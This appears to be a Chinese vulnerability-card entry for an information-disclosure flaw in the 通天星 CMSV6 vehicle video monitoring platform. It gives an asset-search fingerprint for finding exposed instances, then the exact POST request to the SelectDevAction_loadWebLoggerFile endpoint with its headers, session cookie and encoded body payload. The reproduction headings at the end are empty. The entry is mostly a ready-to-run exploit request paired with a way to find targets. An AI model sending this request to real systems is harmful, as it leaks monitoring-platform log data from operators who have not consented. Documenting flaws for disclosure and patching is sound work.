# 通天星CMSV6车载视频监控平台SelectDevAction_loadWebLoggerFile存在信息泄露漏洞

- **系统**：通天星CMSV6车载视频监控平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.body="./open/webApi.html"`
- **请求**：`POST /808gps/LoggerManagement/SelectDevAction_loadWebLoggerFile.action HTTP/1.1`
- **关键头**：`Content-Length: 103`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Cookie: JSESSIONID=87F04E406314662DEF40451BC5114457`

**请求体 / payload**
```
page=1&rp=15&query=&qtype=&pagin=%257B%2522currentPage%2522%253A1%252C%2522pageRecords%2522%253A15%257D
```

**其他**
- 通天星CMSV6车载视频监控平台 SelectDevAction\_loadWebLoggerFile存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通天星CMSV6车载视频监控平台